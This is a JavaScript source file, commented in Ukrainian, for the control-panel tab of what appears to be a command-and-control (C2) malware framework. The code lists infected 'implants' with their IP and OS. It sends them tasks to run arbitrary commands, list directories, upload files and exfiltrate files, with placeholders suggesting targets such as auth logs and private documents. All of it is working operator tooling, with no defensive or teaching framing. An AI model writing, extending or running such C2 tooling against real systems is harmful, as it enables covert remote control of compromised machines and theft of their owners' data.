// js/c2_control_ui.js
// UI логіка для вкладки "C2 Управління"

// --- DOM Елементи ---
let c2ControlTab, implantListDiv, selectedImplantSection, 
    c2NoImplantSelectedDiv, selectedImplantIdSpan, c2TaskForm, 
    c2TaskTypeSelect, c2TaskParamsContainer, c2ResultsOutputArea, // Змінено c2ResultsOutput на c2ResultsOutputArea
    sendTaskButton, refreshImplantsButton, c2QueueTaskCheckbox;

// --- Стан ---
let activeImplantsDataC2UI = [];
let currentSelectedImplantC2UI = null;
let implantsLoadedC2UI = false; // Прапорець для відстеження завантаження даних

// --- Конфігурація секцій параметрів для завдань C2 ---
const c2TaskParamSectionsConfigFE = {
    "list_directory": "params_list_directory_c2",
    "exec_command": "params_exec_command_c2",
    "exfiltrate_file_chunked": "params_exfiltrate_file_chunked_c2", // Використовується для обох
    "download_file": "params_exfiltrate_file_chunked_c2",      // Використовується для обох
    "upload_file_b64": "params_upload_file_b64_c2"
    // "get_system_info" не має додаткових параметрів у формі
};


/**
 * Ініціалізує елементи DOM та обробники подій для вкладки "C2 Управління".
 */
function initializeC2ControlEvents() {
    c2ControlTab = document.getElementById('c2ControlTab');
    implantListDiv = document.getElementById('implantList');
    selectedImplantSection = document.getElementById('selectedImplantSection');
    c2NoImplantSelectedDiv = document.getElementById('c2NoImplantSelected');
    selectedImplantIdSpan = document.getElementById('selectedImplantId');
    c2TaskForm = document.getElementById('c2TaskForm');
    c2TaskTypeSelect = document.getElementById('c2TaskType');
    c2TaskParamsContainer = document.getElementById('c2TaskParamsContainer');
    c2ResultsOutputArea = document.getElementById('c2ResultsOutput'); // Використовуємо нове ім'я
    sendTaskButton = document.getElementById('sendTaskButton');
    refreshImplantsButton = document.getElementById('refreshImplantsButton');
    c2QueueTaskCheckbox = document.getElementById('c2QueueTask');

    if (!implantListDiv || !c2TaskForm || !refreshImplantsButton || !c2TaskTypeSelect || !c2ResultsOutputArea) {
        console.error("Ключові елементи вкладки C2 Управління не знайдено!");
        return;
    }

    refreshImplantsButton.addEventListener('click', fetchAndRenderImplants);
    c2TaskForm.addEventListener('submit', handleC2TaskFormSubmit);
    c2TaskTypeSelect.addEventListener('change', updateC2TaskParamsVisibility);

    // Початкове налаштування видимості параметрів завдання
    updateC2TaskParamsVisibility();
    // Початкове приховування секції вибраного імпланта
    if (selectedImplantSection) selectedImplantSection.classList.add('hidden');
    if (c2NoImplantSelectedDiv) c2NoImplantSelectedDiv.classList.remove('hidden');

    logToC2UIOutput("Модуль C2 Управління ініціалізовано. Оберіть імплант або оновіть список.");
}

/**
 * Завантажує та відображає список імплантів з backend.
 */
async function fetchAndRenderImplants() {
    if (implantsLoadedC2UI) {
        console.log("[C2_UI] Список імплантів вже завантажено.");
        // Можливо, варто просто перерендерити поточні дані, якщо вони могли змінитися без перезавантаження
        // renderImplantsList(activeImplantsDataC2UI); // Потенційна функція для перерендерингу
        return;
    }
    if (!implantListDiv || !refreshImplantsButton) return;

    setButtonLoadingState(refreshImplantsButton, true, 'Оновити');
    logToC2UIOutput("[GUI_C2] Запит списку імплантів з backend...");

    try {
        const response = await fetch(`${API_BASE_URL}/c2/implants`); // Використовуємо API_BASE_URL
        const data = await response.json();

        if (data.success && data.implants) {
            activeImplantsDataC2UI = data.implants;
            implantListDiv.innerHTML = ''; // Очистити поточний список

            if (activeImplantsDataC2UI.length === 0) {
                implantListDiv.innerHTML = '<p class="text-gray-400">Активних імплантів не знайдено на backend.</p>';
            } else {
                activeImplantsDataC2UI.forEach(implant => {
                    const implantDiv = document.createElement('div');
                    implantDiv.className = 'implant-list-item';
                    implantDiv.dataset.implantId = implant.id; // Зберігаємо ID для легкого доступу
                    implantDiv.innerHTML = `
                        <p class="font-semibold text-indigo-300">${implant.id}</p>
                        <p class="text-sm text-gray-400">IP: ${implant.ip || 'N/A'} | OS: ${implant.os || 'N/A'}</p>
                        <p class="text-xs text-gray-500">Останній зв'язок: ${implant.lastSeen || 'N/A'} | Статус: <span class="font-medium ${getImplantStatusColor(implant.status)}">${implant.status || 'N/A'}</span></p>
                    `;
                    implantDiv.addEventListener('click', () => selectImplantForC2(implant));
                    
                    if (currentSelectedImplantC2UI && currentSelectedImplantC2UI.id === implant.id) {
                        implantDiv.classList.add('selected'); // Відновлюємо виділення, якщо воно було
                    }
                    implantListDiv.appendChild(implantDiv);
                });
            }
            logToC2UIOutput(`[GUI_C2] Список імплантів оновлено. Знайдено: ${activeImplantsDataC2UI.length}.`);
            // Оновлюємо статистику на вкладці логів, якщо вона видима
            if (typeof updateActiveImplantsStats === 'function') { // Ця функція буде в logging_adaptation_ui.js
                updateActiveImplantsStats(activeImplantsDataC2UI.length);
            }
            implantsLoadedC2UI = true; // Встановлюємо прапорець після успішного завантаження

        } else {
            logToC2UIOutput(`[GUI_C2_ERROR] Помилка отримання списку імплантів: ${data.error || 'Невідома помилка backend'}`, true);
            implantListDiv.innerHTML = '<p class="text-red-400">Не вдалося завантажити список імплантів.</p>';
        }
    } catch (error) {
        logToC2UIOutput(`[GUI_C2_ERROR] Помилка мережевого запиту для отримання імплантів: ${error.message}`, true);
        implantListDiv.innerHTML = '<p class="text-red-400">Помилка зв\'язку з backend для імплантів.</p>';
        console.error("Fetch implants error:", error);
    } finally {
        setButtonLoadingState(refreshImplantsButton, false, 'Оновити');
    }
}

/**
 * Повертає Tailwind CSS клас кольору для статусу імпланта.
 * @param {string} status - Статус імпланта.
 * @returns {string} - CSS клас.
 */
function getImplantStatusColor(status) {
    if (!status) return 'text-gray-400';
    status = status.toLowerCase();
    if (status.includes('active') || status.includes('idle')) return 'text-green-400';
    if (status.includes('pending') || status.includes('progress')) return 'text-yellow-400';
    if (status.includes('offline') || status.includes('error')) return 'text-red-400';
    return 'text-gray-400';
}


/**
 * Обробляє вибір імпланта зі списку.
 * @param {object} implant - Об'єкт з даними обраного імпланта.
 */
function selectImplantForC2(implant) {
    currentSelectedImplantC2UI = implant;
    if (selectedImplantIdSpan) selectedImplantIdSpan.textContent = implant.id;
    if (selectedImplantSection) selectedImplantSection.classList.remove('hidden');
    if (c2NoImplantSelectedDiv) c2NoImplantSelectedDiv.classList.add('hidden');

    // Оновлення виділення у списку
    const implantItems = implantListDiv.querySelectorAll('.implant-list-item');
    implantItems.forEach(item => {
        item.classList.remove('selected');
        if (item.dataset.implantId === implant.id) {
            item.classList.add('selected');
        }
    });
    updateC2TaskParamsVisibility(); // Оновлюємо видимість полів для завдань
    logToC2UIOutput(`Обрано імплант: ${implant.id} (IP: ${implant.ip || 'N/A'})`);
}

/**
 * Оновлює видимість секцій параметрів для завдань C2 залежно від обраного типу завдання.
 */
function updateC2TaskParamsVisibility() {
    if (!c2TaskTypeSelect || !c2TaskParamsContainer) return;
    const taskType = c2TaskTypeSelect.value;
    clearAllErrors('c2TaskForm'); // Очищаємо помилки валідації при зміні типу

    // Сховати всі секції параметрів
    Array.from(c2TaskParamsContainer.children).forEach(section => {
        if (section.classList.contains('form-section')) { // Переконуємося, що це саме секція параметрів
            section.classList.add('hidden');
        }
    });

    const relevantSectionId = c2TaskParamSectionsConfigFE[taskType];
    if (relevantSectionId) {
        const sectionToShow = document.getElementById(relevantSectionId);
        if (sectionToShow) {
            sectionToShow.classList.remove('hidden');
            
            // Специфічна логіка для міток полів download/exfiltrate
            const exfilField = document.getElementById('c2ExfilFileChunked'); // ID поля для шляху файлу
            const exfilLabel = exfilField ? exfilField.previousElementSibling : null; // Припускаємо, що label йде перед input
            
            if (exfilField && exfilLabel) {
                if (taskType === 'download_file') {
                    exfilLabel.textContent = 'Шлях до Файлу на Імпланті для Завантаження:';
                    exfilField.placeholder = 'напр. C:\\Windows\\System32\\drivers\\etc\\hosts';
                } else if (taskType === 'exfiltrate_file_chunked') {
                    exfilLabel.textContent = 'Шлях до Файлу на Імпланті для Ексфільтрації:';
                    exfilField.placeholder = 'напр. /var/log/auth.log або C:\\Users\\User\\Documents\\secret.docx';
                }
            }
        }
    }
}

/**
 * Валідує форму завдання C2 на стороні клієнта.
 * @returns {boolean} - True, якщо форма валідна.
 */
function validateC2TaskFormClientSide() {
    clearAllErrors('c2TaskForm');
    let isValid = true;
    const taskType = c2TaskTypeSelect.value;

    if (taskType === 'list_directory') {
        // Для list_directory шлях опціональний (за замовчуванням ".")
    } else if (taskType === 'exec_command') {
        const command = document.getElementById('c2ExecCommand').value.trim();
        if (!command) {
            displayError('error-' + document.getElementById('c2ExecCommand').id, 'Команда для виконання є обов\'язковою.');
            isValid = false;
        }
    } else if (taskType === 'exfiltrate_file_chunked' || taskType === 'download_file') {
        const filePath = document.getElementById('c2ExfilFileChunked').value.trim();
        if (!filePath) {
            displayError('error-c2ExfilFileChunked', "Шлях до файлу на імпланті є обов'язковим.");
            isValid = false;
        }
    } else if (taskType === 'upload_file_b64') {
        const remotePath = document.getElementById('c2UploadFilePath').value.trim();
        const contentB64 = document.getElementById('c2UploadFileContentB64').value.trim();
        if (!remotePath) {
            displayError('error-c2UploadFilePath', "Шлях для збереження файлу на імпланті є обов'язковим.");
            isValid = false;
        }
        if (!contentB64) {
            displayError('error-c2UploadFileContentB64', "Вміст файлу (Base64) є обов'язковим.");
            isValid = false;
        } else {
            try { // Перевірка валідності Base64
                atob(contentB64); 
            } catch(e) {
                displayError('error-c2UploadFileContentB64', 'Невірний формат Base64 для вмісту файлу.');
                isValid = false;
            }
        }
    }
    return isValid;
}


/**
 * Обробляє відправку форми завдання C2.
 * @param {Event} event - Подія відправки форми.
 */
async function handleC2TaskFormSubmit(event) {
    event.preventDefault();
    if (!currentSelectedImplantC2UI || !sendTaskButton || !c2ResultsOutputArea) {
        logToC2UIOutput("[GUI_C2_ERROR] Не обрано імплант або відсутні ключові елементи форми.", true);
        return;
    }

    if (!validateC2TaskFormClientSide()) {
        logToC2UIOutput("[GUI_C2_VALIDATION_ERROR] Будь ласка, виправте помилки у формі завдання C2.", true);
        return;
    }

    setButtonLoadingState(sendTaskButton, true, 'Надіслати Завдання');

    const taskType = c2TaskTypeSelect.value;
    let taskParamsValue;

    // Збираємо параметри завдання
    if (taskType === 'list_directory') {
        taskParamsValue = document.getElementById('c2ListdirPath').value.trim() || ".";
    } else if (taskType === 'exec_command') {
        taskParamsValue = document.getElementById('c2ExecCommand').value.trim();
    } else if (taskType === 'exfiltrate_file_chunked' || taskType === 'download_file') {
        taskParamsValue = document.getElementById('c2ExfilFileChunked').value.trim();
    } else if (taskType === 'upload_file_b64') {
        taskParamsValue = {
            path: document.getElementById('c2UploadFilePath').value.trim(),
            content_b64: document.getElementById('c2UploadFileContentB64').value.trim()
        };
    } else { 
         taskParamsValue = ""; // Для завдань без параметрів, як get_system_info
    }

    const queueTask = c2QueueTaskCheckbox ? c2QueueTaskCheckbox.checked : true; // За замовчуванням ставимо в чергу

    const requestBody = {
        implant_id: currentSelectedImplantC2UI.id,
        task_type: taskType,
        task_params: taskParamsValue, 
        queue_task: queueTask
    };

    logToC2UIOutput(`[GUI_C2_TASK_SENT] Надсилання завдання '${taskType}' (Черга: ${queueTask}) з параметрами '${JSON.stringify(taskParamsValue).substring(0,100)}...' на імплант ${currentSelectedImplantC2UI.id}`);
    
    try {
        const response = await fetch(`${API_BASE_URL}/c2/task`, { // Використовуємо API_BASE_URL
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(requestBody),
        });
        const responseData = await response.json();

        if (responseData.log) { // Додаємо лог з backend
            responseData.log.split('\n').forEach(line => logToC2UIOutput(`[BE_LOG] ${line}`));
        }

        if (response.ok && responseData.success) {
            let successMessage = responseData.message || 'Завдання успішно оброблено backend.';
            if (responseData.queued_task) {
                 successMessage += ` ID Завдання: ${responseData.queued_task.task_id}`;
            }
            logToC2UIOutput(`[GUI_C2_TASK_SUCCESS] ${successMessage}`);
            // Опціонально: очистити поля форми після успішної відправки
            // c2TaskForm.reset(); 
            // updateC2TaskParamsVisibility();
        } else {
            logToC2UIOutput(`[GUI_C2_TASK_ERROR] Помилка від backend: ${responseData.error || 'Невідома помилка'}`, true);
        }
    } catch (error) {
        logToC2UIOutput(`[GUI_C2_TASK_ERROR] Помилка мережевого запиту до backend для завдання C2: ${error.message}`, true);
        console.error("C2 Task fetch error:", error);
    } finally {
        setButtonLoadingState(sendTaskButton, false, 'Надіслати Завдання');
    }
}

/**
 * Допоміжна функція для логування в область виводу C2.
 * @param {string} message - Повідомлення для логування.
 * @param {boolean} [isError=false] - Якщо true, повідомлення може бути стилізовано як помилка.
 */
function logToC2UIOutput(message, isError = false) {
    // Використовуємо загальну функцію з ui_utils.js
    if (typeof logToUITextArea === 'function' && c2ResultsOutputArea) {
        logToUITextArea(c2ResultsOutputArea.id, message, isError);
    } else {
        // Резервний варіант, якщо logToUITextArea не доступна
        const c2Out = document.getElementById('c2ResultsOutput'); // Перевіряємо ще раз
        if (c2Out) {
            const timestamp = new Date().toLocaleTimeString();
            c2Out.textContent += `[${timestamp}] ${message}\n`;
            c2Out.scrollTop = c2Out.scrollHeight;
        }
        console.log(`C2_LOG: ${message}`);
    }
}

// Ініціалізація при завантаженні скрипта (буде викликана з main.js)
// initializeC2ControlEvents();
// fetchAndRenderImplants(); // Може бути викликано з main.js при активації вкладки
